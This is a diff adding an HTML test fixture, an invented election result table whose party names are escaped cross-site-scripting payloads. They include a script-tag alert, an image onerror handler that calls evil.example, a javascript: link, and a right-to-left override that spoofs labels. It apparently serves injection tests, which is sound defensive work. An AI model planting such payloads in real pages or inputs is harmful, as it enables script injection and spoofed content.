@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Markupland Assembly — result 2026</title>
+  <!--
+    Adversarial fixture (issue #10). Party names carrying HTML, a script tag, an
+    event handler, a javascript: URL and a right-to-left override. If any of it
+    is ever concatenated into markup instead of set as text, it executes; if the
+    override survives validation, a party label renders as another party's name.
+
+    Used by backend/tests/test_injection.py and test/injection.test.mjs.
+  -->
+</head>
+
+<body>
+  <h1>Markupland Assembly — result, 3 May 2026</h1>
+
+  <table>
+    <thead>
+      <tr><th>Party</th><th>Abbr</th><th>Seats</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>&lt;script&gt;alert('xss')&lt;/script&gt;</td><td>SCR</td><td>5</td></tr>
+      <tr><td>&lt;img src=x onerror="fetch('//evil.example')"&gt;</td><td>IMG</td><td>4</td></tr>
+      <tr><td>&lt;a href="javascript:alert(1)"&gt;Free Party&lt;/a&gt;</td><td>JS</td><td>2</td></tr>
+      <tr><td>Ordinary&#x202E; Party</td><td>ORD</td><td>4</td></tr>
+    </tbody>
+  </table>
+
+  <p>15 seats in total; 8 are needed for a majority.</p>
+</body>
+
+</html>
